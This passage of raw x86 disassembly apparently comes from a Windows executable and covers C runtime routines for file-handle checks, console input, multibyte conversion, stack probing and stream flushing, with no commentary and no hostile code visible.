  4074b1:	5e                   	pop    %esi
  4074b2:	5b                   	pop    %ebx
  4074b3:	5d                   	pop    %ebp
  4074b4:	c3                   	ret
  4074b5:	8b ff                	mov    %edi,%edi
  4074b7:	55                   	push   %ebp
  4074b8:	8b ec                	mov    %esp,%ebp
  4074ba:	8b 45 08             	mov    0x8(%ebp),%eax
  4074bd:	83 f8 fe             	cmp    $0xfffffffe,%eax
  4074c0:	75 18                	jne    0x4074da
  4074c2:	e8 cb a4 ff ff       	call   0x401992
  4074c7:	83 20 00             	andl   $0x0,(%eax)
  4074ca:	e8 b0 a4 ff ff       	call   0x40197f
  4074cf:	c7 00 09 00 00 00    	movl   $0x9,(%eax)
  4074d5:	83 c8 ff             	or     $0xffffffff,%eax
  4074d8:	5d                   	pop    %ebp
  4074d9:	c3                   	ret
  4074da:	56                   	push   %esi
  4074db:	33 f6                	xor    %esi,%esi
  4074dd:	3b c6                	cmp    %esi,%eax
  4074df:	7c 22                	jl     0x407503
  4074e1:	3b 05 ac f9 40 00    	cmp    0x40f9ac,%eax
  4074e7:	73 1a                	jae    0x407503
  4074e9:	8b c8                	mov    %eax,%ecx
  4074eb:	83 e0 1f             	and    $0x1f,%eax
  4074ee:	c1 f9 05             	sar    $0x5,%ecx
  4074f1:	8b 0c 8d c0 f9 40 00 	mov    0x40f9c0(,%ecx,4),%ecx
  4074f8:	c1 e0 06             	shl    $0x6,%eax
  4074fb:	03 c1                	add    %ecx,%eax
  4074fd:	f6 40 04 01          	testb  $0x1,0x4(%eax)
  407501:	75 24                	jne    0x407527
  407503:	e8 8a a4 ff ff       	call   0x401992
  407508:	89 30                	mov    %esi,(%eax)
  40750a:	e8 70 a4 ff ff       	call   0x40197f
  40750f:	56                   	push   %esi
  407510:	56                   	push   %esi
  407511:	56                   	push   %esi
  407512:	56                   	push   %esi
  407513:	56                   	push   %esi
  407514:	c7 00 09 00 00 00    	movl   $0x9,(%eax)
  40751a:	e8 f8 a3 ff ff       	call   0x401917
  40751f:	83 c4 14             	add    $0x14,%esp
  407522:	83 c8 ff             	or     $0xffffffff,%eax
  407525:	eb 02                	jmp    0x407529
  407527:	8b 00                	mov    (%eax),%eax
  407529:	5e                   	pop    %esi
  40752a:	5d                   	pop    %ebp
  40752b:	c3                   	ret
  40752c:	6a 0c                	push   $0xc
  40752e:	68 a8 b7 40 00       	push   $0x40b7a8
  407533:	e8 e8 b9 ff ff       	call   0x402f20
  407538:	8b 7d 08             	mov    0x8(%ebp),%edi
  40753b:	8b c7                	mov    %edi,%eax
  40753d:	c1 f8 05             	sar    $0x5,%eax
  407540:	8b f7                	mov    %edi,%esi
  407542:	83 e6 1f             	and    $0x1f,%esi
  407545:	c1 e6 06             	shl    $0x6,%esi
  407548:	03 34 85 c0 f9 40 00 	add    0x40f9c0(,%eax,4),%esi
  40754f:	c7 45 e4 01 00 00 00 	movl   $0x1,-0x1c(%ebp)
  407556:	33 db                	xor    %ebx,%ebx
  407558:	39 5e 08             	cmp    %ebx,0x8(%esi)
  40755b:	75 36                	jne    0x407593
  40755d:	6a 0a                	push   $0xa
  40755f:	e8 f2 e5 ff ff       	call   0x405b56
  407564:	59                   	pop    %ecx
  407565:	89 5d fc             	mov    %ebx,-0x4(%ebp)
  407568:	39 5e 08             	cmp    %ebx,0x8(%esi)
  40756b:	75 1a                	jne    0x407587
  40756d:	68 a0 0f 00 00       	push   $0xfa0
  407572:	8d 46 0c             	lea    0xc(%esi),%eax
  407575:	50                   	push   %eax
  407576:	e8 e1 ea ff ff       	call   0x40605c
  40757b:	59                   	pop    %ecx
  40757c:	59                   	pop    %ecx
  40757d:	85 c0                	test   %eax,%eax
  40757f:	75 03                	jne    0x407584
  407581:	89 5d e4             	mov    %ebx,-0x1c(%ebp)
  407584:	ff 46 08             	incl   0x8(%esi)
  407587:	c7 45 fc fe ff ff ff 	movl   $0xfffffffe,-0x4(%ebp)
  40758e:	e8 30 00 00 00       	call   0x4075c3
  407593:	39 5d e4             	cmp    %ebx,-0x1c(%ebp)
  407596:	74 1d                	je     0x4075b5
  407598:	8b c7                	mov    %edi,%eax
  40759a:	c1 f8 05             	sar    $0x5,%eax
  40759d:	83 e7 1f             	and    $0x1f,%edi
  4075a0:	c1 e7 06             	shl    $0x6,%edi
  4075a3:	8b 04 85 c0 f9 40 00 	mov    0x40f9c0(,%eax,4),%eax
  4075aa:	8d 44 38 0c          	lea    0xc(%eax,%edi,1),%eax
  4075ae:	50                   	push   %eax
  4075af:	ff 15 e4 a0 40 00    	call   *0x40a0e4
  4075b5:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  4075b8:	e8 a8 b9 ff ff       	call   0x402f65
  4075bd:	c3                   	ret
  4075be:	33 db                	xor    %ebx,%ebx
  4075c0:	8b 7d 08             	mov    0x8(%ebp),%edi
  4075c3:	6a 0a                	push   $0xa
  4075c5:	e8 b2 e4 ff ff       	call   0x405a7c
  4075ca:	59                   	pop    %ecx
  4075cb:	c3                   	ret
  4075cc:	8b ff                	mov    %edi,%edi
  4075ce:	55                   	push   %ebp
  4075cf:	8b ec                	mov    %esp,%ebp
  4075d1:	8b 45 08             	mov    0x8(%ebp),%eax
  4075d4:	8b c8                	mov    %eax,%ecx
  4075d6:	83 e0 1f             	and    $0x1f,%eax
  4075d9:	c1 f9 05             	sar    $0x5,%ecx
  4075dc:	8b 0c 8d c0 f9 40 00 	mov    0x40f9c0(,%ecx,4),%ecx
  4075e3:	c1 e0 06             	shl    $0x6,%eax
  4075e6:	8d 44 01 0c          	lea    0xc(%ecx,%eax,1),%eax
  4075ea:	50                   	push   %eax
  4075eb:	ff 15 e8 a0 40 00    	call   *0x40a0e8
  4075f1:	5d                   	pop    %ebp
  4075f2:	c3                   	ret
  4075f3:	8b ff                	mov    %edi,%edi
  4075f5:	55                   	push   %ebp
  4075f6:	8b ec                	mov    %esp,%ebp
  4075f8:	83 ec 10             	sub    $0x10,%esp
  4075fb:	a1 60 db 40 00       	mov    0x40db60,%eax
  407600:	33 c5                	xor    %ebp,%eax
  407602:	89 45 fc             	mov    %eax,-0x4(%ebp)
  407605:	56                   	push   %esi
  407606:	33 f6                	xor    %esi,%esi
  407608:	39 35 90 dc 40 00    	cmp    %esi,0x40dc90
  40760e:	74 4f                	je     0x40765f
  407610:	83 3d d4 dd 40 00 fe 	cmpl   $0xfffffffe,0x40ddd4
  407617:	75 05                	jne    0x40761e
  407619:	e8 f1 1e 00 00       	call   0x40950f
  40761e:	a1 d4 dd 40 00       	mov    0x40ddd4,%eax
  407623:	83 f8 ff             	cmp    $0xffffffff,%eax
  407626:	75 07                	jne    0x40762f
  407628:	b8 ff ff 00 00       	mov    $0xffff,%eax
  40762d:	eb 70                	jmp    0x40769f
  40762f:	56                   	push   %esi
  407630:	8d 4d f0             	lea    -0x10(%ebp),%ecx
  407633:	51                   	push   %ecx
  407634:	6a 01                	push   $0x1
  407636:	8d 4d 08             	lea    0x8(%ebp),%ecx
  407639:	51                   	push   %ecx
  40763a:	50                   	push   %eax
  40763b:	ff 15 20 a1 40 00    	call   *0x40a120
  407641:	85 c0                	test   %eax,%eax
  407643:	75 67                	jne    0x4076ac
  407645:	83 3d 90 dc 40 00 02 	cmpl   $0x2,0x40dc90
  40764c:	75 da                	jne    0x407628
  40764e:	ff 15 8c a0 40 00    	call   *0x40a08c
  407654:	83 f8 78             	cmp    $0x78,%eax
  407657:	75 cf                	jne    0x407628
  407659:	89 35 90 dc 40 00    	mov    %esi,0x40dc90
  40765f:	56                   	push   %esi
  407660:	56                   	push   %esi
  407661:	6a 05                	push   $0x5
  407663:	8d 45 f4             	lea    -0xc(%ebp),%eax
  407666:	50                   	push   %eax
  407667:	6a 01                	push   $0x1
  407669:	8d 45 08             	lea    0x8(%ebp),%eax
  40766c:	50                   	push   %eax
  40766d:	56                   	push   %esi
  40766e:	ff 15 1c a1 40 00    	call   *0x40a11c
  407674:	50                   	push   %eax
  407675:	ff 15 88 a0 40 00    	call   *0x40a088
  40767b:	8b 0d d4 dd 40 00    	mov    0x40ddd4,%ecx
  407681:	83 f9 ff             	cmp    $0xffffffff,%ecx
  407684:	74 a2                	je     0x407628
  407686:	56                   	push   %esi
  407687:	8d 55 f0             	lea    -0x10(%ebp),%edx
  40768a:	52                   	push   %edx
  40768b:	50                   	push   %eax
  40768c:	8d 45 f4             	lea    -0xc(%ebp),%eax
  40768f:	50                   	push   %eax
  407690:	51                   	push   %ecx
  407691:	ff 15 18 a1 40 00    	call   *0x40a118
  407697:	85 c0                	test   %eax,%eax
  407699:	74 8d                	je     0x407628
  40769b:	66 8b 45 08          	mov    0x8(%ebp),%ax
  40769f:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  4076a2:	33 cd                	xor    %ebp,%ecx
  4076a4:	5e                   	pop    %esi
  4076a5:	e8 45 d5 ff ff       	call   0x404bef
  4076aa:	c9                   	leave
  4076ab:	c3                   	ret
  4076ac:	c7 05 90 dc 40 00 01 	movl   $0x1,0x40dc90
  4076b3:	00 00 00 
  4076b6:	eb e3                	jmp    0x40769b
  4076b8:	8b ff                	mov    %edi,%edi
  4076ba:	55                   	push   %ebp
  4076bb:	8b ec                	mov    %esp,%ebp
  4076bd:	83 ec 10             	sub    $0x10,%esp
  4076c0:	53                   	push   %ebx
  4076c1:	56                   	push   %esi
  4076c2:	8b 75 0c             	mov    0xc(%ebp),%esi
  4076c5:	33 db                	xor    %ebx,%ebx
  4076c7:	3b f3                	cmp    %ebx,%esi
  4076c9:	74 15                	je     0x4076e0
  4076cb:	39 5d 10             	cmp    %ebx,0x10(%ebp)
  4076ce:	74 10                	je     0x4076e0
  4076d0:	38 1e                	cmp    %bl,(%esi)
  4076d2:	75 12                	jne    0x4076e6
  4076d4:	8b 45 08             	mov    0x8(%ebp),%eax
  4076d7:	3b c3                	cmp    %ebx,%eax
  4076d9:	74 05                	je     0x4076e0
  4076db:	33 c9                	xor    %ecx,%ecx
  4076dd:	66 89 08             	mov    %cx,(%eax)
  4076e0:	33 c0                	xor    %eax,%eax
  4076e2:	5e                   	pop    %esi
  4076e3:	5b                   	pop    %ebx
  4076e4:	c9                   	leave
  4076e5:	c3                   	ret
  4076e6:	ff 75 14             	push   0x14(%ebp)
  4076e9:	8d 4d f0             	lea    -0x10(%ebp),%ecx
  4076ec:	e8 68 a0 ff ff       	call   0x401759
  4076f1:	8b 45 f0             	mov    -0x10(%ebp),%eax
  4076f4:	39 58 14             	cmp    %ebx,0x14(%eax)
  4076f7:	75 1f                	jne    0x407718
  4076f9:	8b 45 08             	mov    0x8(%ebp),%eax
  4076fc:	3b c3                	cmp    %ebx,%eax
  4076fe:	74 07                	je     0x407707
  407700:	66 0f b6 0e          	movzbw (%esi),%cx
  407704:	66 89 08             	mov    %cx,(%eax)
  407707:	38 5d fc             	cmp    %bl,-0x4(%ebp)
  40770a:	74 07                	je     0x407713
  40770c:	8b 45 f8             	mov    -0x8(%ebp),%eax
  40770f:	83 60 70 fd          	andl   $0xfffffffd,0x70(%eax)
  407713:	33 c0                	xor    %eax,%eax
  407715:	40                   	inc    %eax
  407716:	eb ca                	jmp    0x4076e2
  407718:	8d 45 f0             	lea    -0x10(%ebp),%eax
  40771b:	50                   	push   %eax
  40771c:	0f b6 06             	movzbl (%esi),%eax
  40771f:	50                   	push   %eax
  407720:	e8 7f d4 ff ff       	call   0x404ba4
  407725:	59                   	pop    %ecx
  407726:	59                   	pop    %ecx
  407727:	85 c0                	test   %eax,%eax
  407729:	74 7d                	je     0x4077a8
  40772b:	8b 45 f0             	mov    -0x10(%ebp),%eax
  40772e:	8b 88 ac 00 00 00    	mov    0xac(%eax),%ecx
  407734:	83 f9 01             	cmp    $0x1,%ecx
  407737:	7e 25                	jle    0x40775e
  407739:	39 4d 10             	cmp    %ecx,0x10(%ebp)
  40773c:	7c 20                	jl     0x40775e
  40773e:	33 d2                	xor    %edx,%edx
  407740:	39 5d 08             	cmp    %ebx,0x8(%ebp)
  407743:	0f 95 c2             	setne  %dl
  407746:	52                   	push   %edx
  407747:	ff 75 08             	push   0x8(%ebp)
  40774a:	51                   	push   %ecx
  40774b:	56                   	push   %esi
  40774c:	6a 09                	push   $0x9
  40774e:	ff 70 04             	push   0x4(%eax)
  407751:	ff 15 24 a1 40 00    	call   *0x40a124
  407757:	85 c0                	test   %eax,%eax
  407759:	8b 45 f0             	mov    -0x10(%ebp),%eax
  40775c:	75 10                	jne    0x40776e
  40775e:	8b 4d 10             	mov    0x10(%ebp),%ecx
  407761:	3b 88 ac 00 00 00    	cmp    0xac(%eax),%ecx
  407767:	72 20                	jb     0x407789
  407769:	38 5e 01             	cmp    %bl,0x1(%esi)
  40776c:	74 1b                	je     0x407789
  40776e:	8b 80 ac 00 00 00    	mov    0xac(%eax),%eax
  407774:	38 5d fc             	cmp    %bl,-0x4(%ebp)
  407777:	0f 84 65 ff ff ff    	je     0x4076e2
  40777d:	8b 4d f8             	mov    -0x8(%ebp),%ecx
  407780:	83 61 70 fd          	andl   $0xfffffffd,0x70(%ecx)
  407784:	e9 59 ff ff ff       	jmp    0x4076e2
  407789:	e8 f1 a1 ff ff       	call   0x40197f
  40778e:	c7 00 2a 00 00 00    	movl   $0x2a,(%eax)
  407794:	38 5d fc             	cmp    %bl,-0x4(%ebp)
  407797:	74 07                	je     0x4077a0
  407799:	8b 45 f8             	mov    -0x8(%ebp),%eax
  40779c:	83 60 70 fd          	andl   $0xfffffffd,0x70(%eax)
  4077a0:	83 c8 ff             	or     $0xffffffff,%eax
  4077a3:	e9 3a ff ff ff       	jmp    0x4076e2
  4077a8:	33 c0                	xor    %eax,%eax
  4077aa:	39 5d 08             	cmp    %ebx,0x8(%ebp)
  4077ad:	0f 95 c0             	setne  %al
  4077b0:	50                   	push   %eax
  4077b1:	ff 75 08             	push   0x8(%ebp)
  4077b4:	8b 45 f0             	mov    -0x10(%ebp),%eax
  4077b7:	6a 01                	push   $0x1
  4077b9:	56                   	push   %esi
  4077ba:	6a 09                	push   $0x9
  4077bc:	ff 70 04             	push   0x4(%eax)
  4077bf:	ff 15 24 a1 40 00    	call   *0x40a124
  4077c5:	85 c0                	test   %eax,%eax
  4077c7:	0f 85 3a ff ff ff    	jne    0x407707
  4077cd:	eb ba                	jmp    0x407789
  4077cf:	8b ff                	mov    %edi,%edi
  4077d1:	55                   	push   %ebp
  4077d2:	8b ec                	mov    %esp,%ebp
  4077d4:	6a 00                	push   $0x0
  4077d6:	ff 75 10             	push   0x10(%ebp)
  4077d9:	ff 75 0c             	push   0xc(%ebp)
  4077dc:	ff 75 08             	push   0x8(%ebp)
  4077df:	e8 d4 fe ff ff       	call   0x4076b8
  4077e4:	83 c4 10             	add    $0x10,%esp
  4077e7:	5d                   	pop    %ebp
  4077e8:	c3                   	ret
  4077e9:	cc                   	int3
  4077ea:	cc                   	int3
  4077eb:	cc                   	int3
  4077ec:	cc                   	int3
  4077ed:	cc                   	int3
  4077ee:	cc                   	int3
  4077ef:	cc                   	int3
  4077f0:	51                   	push   %ecx
  4077f1:	8d 4c 24 04          	lea    0x4(%esp),%ecx
  4077f5:	2b c8                	sub    %eax,%ecx
  4077f7:	1b c0                	sbb    %eax,%eax
  4077f9:	f7 d0                	not    %eax
  4077fb:	23 c8                	and    %eax,%ecx
  4077fd:	8b c4                	mov    %esp,%eax
  4077ff:	25 00 f0 ff ff       	and    $0xfffff000,%eax
  407804:	3b c8                	cmp    %eax,%ecx
  407806:	72 0a                	jb     0x407812
  407808:	8b c1                	mov    %ecx,%eax
  40780a:	59                   	pop    %ecx
  40780b:	94                   	xchg   %eax,%esp
  40780c:	8b 00                	mov    (%eax),%eax
  40780e:	89 04 24             	mov    %eax,(%esp)
  407811:	c3                   	ret
  407812:	2d 00 10 00 00       	sub    $0x1000,%eax
  407817:	85 00                	test   %eax,(%eax)
  407819:	eb e9                	jmp    0x407804
  40781b:	6a 10                	push   $0x10
  40781d:	68 c8 b7 40 00       	push   $0x40b7c8
  407822:	e8 f9 b6 ff ff       	call   0x402f20
  407827:	33 db                	xor    %ebx,%ebx
  407829:	89 5d e4             	mov    %ebx,-0x1c(%ebp)
  40782c:	6a 01                	push   $0x1
  40782e:	e8 23 e3 ff ff       	call   0x405b56
  407833:	59                   	pop    %ecx
  407834:	89 5d fc             	mov    %ebx,-0x4(%ebp)
  407837:	6a 03                	push   $0x3
  407839:	5f                   	pop    %edi
  40783a:	89 7d e0             	mov    %edi,-0x20(%ebp)
  40783d:	3b 3d a0 f9 40 00    	cmp    0x40f9a0,%edi
  407843:	7d 57                	jge    0x40789c
  407845:	8b f7                	mov    %edi,%esi
  407847:	c1 e6 02             	shl    $0x2,%esi
  40784a:	a1 80 e9 40 00       	mov    0x40e980,%eax
  40784f:	03 c6                	add    %esi,%eax
  407851:	39 18                	cmp    %ebx,(%eax)
  407853:	74 44                	je     0x407899
  407855:	8b 00                	mov    (%eax),%eax
  407857:	f6 40 0c 83          	testb  $0x83,0xc(%eax)
  40785b:	74 0f                	je     0x40786c
  40785d:	50                   	push   %eax
  40785e:	e8 6f 1d 00 00       	call   0x4095d2
  407863:	59                   	pop    %ecx
  407864:	83 f8 ff             	cmp    $0xffffffff,%eax
  407867:	74 03                	je     0x40786c
  407869:	ff 45 e4             	incl   -0x1c(%ebp)
  40786c:	83 ff 14             	cmp    $0x14,%edi
  40786f:	7c 28                	jl     0x407899
  407871:	a1 80 e9 40 00       	mov    0x40e980,%eax
  407876:	8b 04 06             	mov    (%esi,%eax,1),%eax
  407879:	83 c0 20             	add    $0x20,%eax
  40787c:	50                   	push   %eax
  40787d:	ff 15 9c a0 40 00    	call   *0x40a09c
  407883:	a1 80 e9 40 00       	mov    0x40e980,%eax
  407888:	ff 34 06             	push   (%esi,%eax,1)
  40788b:	e8 5b cf ff ff       	call   0x4047eb
  407890:	59                   	pop    %ecx
  407891:	a1 80 e9 40 00       	mov    0x40e980,%eax
  407896:	89 1c 06             	mov    %ebx,(%esi,%eax,1)
  407899:	47                   	inc    %edi
  40789a:	eb 9e                	jmp    0x40783a
  40789c:	c7 45 fc fe ff ff ff 	movl   $0xfffffffe,-0x4(%ebp)
  4078a3:	e8 09 00 00 00       	call   0x4078b1
  4078a8:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  4078ab:	e8 b5 b6 ff ff       	call   0x402f65
  4078b0:	c3                   	ret
  4078b1:	6a 01                	push   $0x1
  4078b3:	e8 c4 e1 ff ff       	call   0x405a7c
  4078b8:	59                   	pop    %ecx
  4078b9:	c3                   	ret
  4078ba:	8b ff                	mov    %edi,%edi
  4078bc:	55                   	push   %ebp
  4078bd:	8b ec                	mov    %esp,%ebp
  4078bf:	53                   	push   %ebx
  4078c0:	56                   	push   %esi
  4078c1:	8b 75 08             	mov    0x8(%ebp),%esi
  4078c4:	8b 46 0c             	mov    0xc(%esi),%eax
  4078c7:	8b c8                	mov    %eax,%ecx
  4078c9:	80 e1 03             	and    $0x3,%cl
  4078cc:	33 db                	xor    %ebx,%ebx
  4078ce:	80 f9 02             	cmp    $0x2,%cl
  4078d1:	75 40                	jne    0x407913
  4078d3:	a9 08 01 00 00       	test   $0x108,%eax
  4078d8:	74 39                	je     0x407913
  4078da:	8b 46 08             	mov    0x8(%esi),%eax
  4078dd:	57                   	push   %edi
  4078de:	8b 3e                	mov    (%esi),%edi
  4078e0:	2b f8                	sub    %eax,%edi
  4078e2:	85 ff                	test   %edi,%edi
  4078e4:	7e 2c                	jle    0x407912
  4078e6:	57                   	push   %edi
  4078e7:	50                   	push   %eax
  4078e8:	56                   	push   %esi
  4078e9:	e8 c3 c4 ff ff       	call   0x403db1
  4078ee:	59                   	pop    %ecx
  4078ef:	50                   	push   %eax
  4078f0:	e8 7e c1 ff ff       	call   0x403a73
  4078f5:	83 c4 0c             	add    $0xc,%esp
  4078f8:	3b c7                	cmp    %edi,%eax
  4078fa:	75 0f                	jne    0x40790b
  4078fc:	8b 46 0c             	mov    0xc(%esi),%eax
  4078ff:	84 c0                	test   %al,%al
  407901:	79 0f                	jns    0x407912
  407903:	83 e0 fd             	and    $0xfffffffd,%eax
  407906:	89 46 0c             	mov    %eax,0xc(%esi)
  407909:	eb 07                	jmp    0x407912
  40790b:	83 4e 0c 20          	orl    $0x20,0xc(%esi)
  40790f:	83 cb ff             	or     $0xffffffff,%ebx
  407912:	5f                   	pop    %edi
  407913:	8b 46 08             	mov    0x8(%esi),%eax
  407916:	83 66 04 00          	andl   $0x0,0x4(%esi)
  40791a:	89 06                	mov    %eax,(%esi)
  40791c:	5e                   	pop    %esi
  40791d:	8b c3                	mov    %ebx,%eax
  40791f:	5b                   	pop    %ebx
  407920:	5d                   	pop    %ebp
  407921:	c3                   	ret
  407922:	8b ff                	mov    %edi,%edi
  407924:	55                   	push   %ebp
  407925:	8b ec                	mov    %esp,%ebp
  407927:	56                   	push   %esi
  407928:	8b 75 08             	mov    0x8(%ebp),%esi
  40792b:	85 f6                	test   %esi,%esi
  40792d:	75 09                	jne    0x407938
  40792f:	56                   	push   %esi
  407930:	e8 35 00 00 00       	call   0x40796a
  407935:	59                   	pop    %ecx
  407936:	eb 2f                	jmp    0x407967
  407938:	56                   	push   %esi
  407939:	e8 7c ff ff ff       	call   0x4078ba
  40793e:	59                   	pop    %ecx
  40793f:	85 c0                	test   %eax,%eax
  407941:	74 05                	je     0x407948
  407943:	83 c8 ff             	or     $0xffffffff,%eax
  407946:	eb 1f                	jmp    0x407967
  407948:	f7 46 0c 00 40 00 00 	testl  $0x4000,0xc(%esi)
  40794f:	74 14                	je     0x407965
  407951:	56                   	push   %esi
  407952:	e8 5a c4 ff ff       	call   0x403db1
  407957:	50                   	push   %eax
  407958:	e8 f1 1c 00 00       	call   0x40964e
  40795d:	59                   	pop    %ecx
  40795e:	f7 d8                	neg    %eax
  407960:	59                   	pop    %ecx
  407961:	1b c0                	sbb    %eax,%eax
  407963:	eb 02                	jmp    0x407967
  407965:	33 c0                	xor    %eax,%eax
  407967:	5e                   	pop    %esi
  407968:	5d                   	pop    %ebp
  407969:	c3                   	ret
  40796a:	6a 14                	push   $0x14
  40796c:	68 e8 b7 40 00       	push   $0x40b7e8
  407971:	e8 aa b5 ff ff       	call   0x402f20
  407976:	33 ff                	xor    %edi,%edi
  407978:	89 7d e4             	mov    %edi,-0x1c(%ebp)
  40797b:	89 7d dc             	mov    %edi,-0x24(%ebp)
  40797e:	6a 01                	push   $0x1
  407980:	e8 d1 e1 ff ff       	call   0x405b56
  407985:	59                   	pop    %ecx
  407986:	89 7d fc             	mov    %edi,-0x4(%ebp)
  407989:	33 f6                	xor    %esi,%esi
  40798b:	89 75 e0             	mov    %esi,-0x20(%ebp)
  40798e:	3b 35 a0 f9 40 00    	cmp    0x40f9a0,%esi
  407994:	0f 8d 83 00 00 00    	jge    0x407a1d
  40799a:	a1 80 e9 40 00       	mov    0x40e980,%eax
  40799f:	8d 04 b0             	lea    (%eax,%esi,4),%eax
  4079a2:	39 38                	cmp    %edi,(%eax)
  4079a4:	74 5e                	je     0x407a04
  4079a6:	8b 00                	mov    (%eax),%eax
  4079a8:	f6 40 0c 83          	testb  $0x83,0xc(%eax)
  4079ac:	74 56                	je     0x407a04
  4079ae:	50                   	push   %eax
  4079af:	56                   	push   %esi
  4079b0:	e8 5f c3 ff ff       	call   0x403d14
  4079b5:	59                   	pop    %ecx
  4079b6:	59                   	pop    %ecx
  4079b7:	33 d2                	xor    %edx,%edx
  4079b9:	42                   	inc    %edx
  4079ba:	89 55 fc             	mov    %edx,-0x4(%ebp)
  4079bd:	a1 80 e9 40 00       	mov    0x40e980,%eax
  4079c2:	8b 04 b0             	mov    (%eax,%esi,4),%eax
  4079c5:	8b 48 0c             	mov    0xc(%eax),%ecx
  4079c8:	f6 c1 83             	test   $0x83,%cl
  4079cb:	74 2f                	je     0x4079fc
  4079cd:	39 55 08             	cmp    %edx,0x8(%ebp)
  4079d0:	75 11                	jne    0x4079e3
  4079d2:	50                   	push   %eax
  4079d3:	e8 4a ff ff ff       	call   0x407922
  4079d8:	59                   	pop    %ecx
  4079d9:	83 f8 ff             	cmp    $0xffffffff,%eax
  4079dc:	74 1e                	je     0x4079fc
  4079de:	ff 45 e4             	incl   -0x1c(%ebp)
  4079e1:	eb 19                	jmp    0x4079fc
  4079e3:	39 7d 08             	cmp    %edi,0x8(%ebp)
  4079e6:	75 14                	jne    0x4079fc
  4079e8:	f6 c1 02             	test   $0x2,%cl
  4079eb:	74 0f                	je     0x4079fc
  4079ed:	50                   	push   %eax
  4079ee:	e8 2f ff ff ff       	call   0x407922
  4079f3:	59                   	pop    %ecx
  4079f4:	83 f8 ff             	cmp    $0xffffffff,%eax
  4079f7:	75 03                	jne    0x4079fc
  4079f9:	09 45 dc             	or     %eax,-0x24(%ebp)
  4079fc:	89 7d fc             	mov    %edi,-0x4(%ebp)
  4079ff:	e8 08 00 00 00       	call   0x407a0c
  407a04:	46                   	inc    %esi
  407a05:	eb 84                	jmp    0x40798b
  407a07:	33 ff                	xor    %edi,%edi
  407a09:	8b 75 e0             	mov    -0x20(%ebp),%esi
  407a0c:	a1 80 e9 40 00       	mov    0x40e980,%eax
  407a11:	ff 34 b0             	push   (%eax,%esi,4)
  407a14:	56                   	push   %esi
  407a15:	e8 68 c3 ff ff       	call   0x403d82
  407a1a:	59                   	pop    %ecx
  407a1b:	59                   	pop    %ecx
  407a1c:	c3                   	ret
  407a1d:	c7 45 fc fe ff ff ff 	movl   $0xfffffffe,-0x4(%ebp)
  407a24:	e8 12 00 00 00       	call   0x407a3b
  407a29:	83 7d 08 01          	cmpl   $0x1,0x8(%ebp)
  407a2d:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  407a30:	74 03                	je     0x407a35
  407a32:	8b 45 dc             	mov    -0x24(%ebp),%eax
  407a35:	e8 2b b5 ff ff       	call   0x402f65
  407a3a:	c3                   	ret
  407a3b:	6a 01                	push   $0x1
  407a3d:	e8 3a e0 ff ff       	call   0x405a7c
  407a42:	59                   	pop    %ecx
  407a43:	c3                   	ret
  407a44:	6a 01                	push   $0x1
  407a46:	e8 1f ff ff ff       	call   0x40796a
  407a4b:	59                   	pop    %ecx
  407a4c:	c3                   	ret
  407a4d:	8b ff                	mov    %edi,%edi
  407a4f:	55                   	push   %ebp
  407a50:	8b ec                	mov    %esp,%ebp
  407a52:	8b 45 08             	mov    0x8(%ebp),%eax
  407a55:	85 c0                	test   %eax,%eax
  407a57:	74 12                	je     0x407a6b
  407a59:	83 e8 08             	sub    $0x8,%eax
  407a5c:	81 38 dd dd 00 00    	cmpl   $0xdddd,(%eax)
  407a62:	75 07                	jne    0x407a6b
  407a64:	50                   	push   %eax
  407a65:	e8 81 cd ff ff       	call   0x4047eb
  407a6a:	59                   	pop    %ecx
  407a6b:	5d                   	pop    %ebp
  407a6c:	c3                   	ret
  407a6d:	8b ff                	mov    %edi,%edi
  407a6f:	55                   	push   %ebp
  407a70:	8b ec                	mov    %esp,%ebp
  407a72:	83 ec 14             	sub    $0x14,%esp
  407a75:	a1 60 db 40 00       	mov    0x40db60,%eax
  407a7a:	33 c5                	xor    %ebp,%eax
  407a7c:	89 45 fc             	mov    %eax,-0x4(%ebp)
  407a7f:	53                   	push   %ebx
  407a80:	56                   	push   %esi
  407a81:	33 db                	xor    %ebx,%ebx
  407a83:	57                   	push   %edi
  407a84:	8b f1                	mov    %ecx,%esi
  407a86:	39 1d 64 e5 40 00    	cmp    %ebx,0x40e564
  407a8c:	75 38                	jne    0x407ac6
  407a8e:	53                   	push   %ebx
  407a8f:	53                   	push   %ebx
  407a90:	33 ff                	xor    %edi,%edi
  407a92:	47                   	inc    %edi
  407a93:	57                   	push   %edi
  407a94:	68 2c aa 40 00       	push   $0x40aa2c
  407a99:	68 00 01 00 00       	push   $0x100
  407a9e:	53                   	push   %ebx
  407a9f:	ff 15 2c a1 40 00    	call   *0x40a12c
  407aa5:	85 c0                	test   %eax,%eax
  407aa7:	74 08                	je     0x407ab1
  407aa9:	89 3d 64 e5 40 00    	mov    %edi,0x40e564
  407aaf:	eb 15                	jmp    0x407ac6
  407ab1:	ff 15 8c a0 40 00    	call   *0x40a08c
  407ab7:	83 f8 78             	cmp    $0x78,%eax
  407aba:	75 0a                	jne    0x407ac6
  407abc:	c7 05 64 e5 40 00 02 	movl   $0x2,0x40e564
  407ac3:	00 00 00 
  407ac6:	39 5d 14             	cmp    %ebx,0x14(%ebp)
  407ac9:	7e 22                	jle    0x407aed
  407acb:	8b 4d 14             	mov    0x14(%ebp),%ecx
  407ace:	8b 45 10             	mov    0x10(%ebp),%eax
  407ad1:	49                   	dec    %ecx
  407ad2:	38 18                	cmp    %bl,(%eax)
  407ad4:	74 08                	je     0x407ade
  407ad6:	40                   	inc    %eax
  407ad7:	3b cb                	cmp    %ebx,%ecx
  407ad9:	75 f6                	jne    0x407ad1
  407adb:	83 c9 ff             	or     $0xffffffff,%ecx
  407ade:	8b 45 14             	mov    0x14(%ebp),%eax
  407ae1:	2b c1                	sub    %ecx,%eax
  407ae3:	48                   	dec    %eax
  407ae4:	3b 45 14             	cmp    0x14(%ebp),%eax
  407ae7:	7d 01                	jge    0x407aea
  407ae9:	40                   	inc    %eax
  407aea:	89 45 14             	mov    %eax,0x14(%ebp)
  407aed:	a1 64 e5 40 00       	mov    0x40e564,%eax
  407af2:	83 f8 02             	cmp    $0x2,%eax
  407af5:	0f 84 ac 01 00 00    	je     0x407ca7
  407afb:	3b c3                	cmp    %ebx,%eax
  407afd:	0f 84 a4 01 00 00    	je     0x407ca7
  407b03:	83 f8 01             	cmp    $0x1,%eax
  407b06:	0f 85 cc 01 00 00    	jne    0x407cd8
  407b0c:	89 5d f8             	mov    %ebx,-0x8(%ebp)
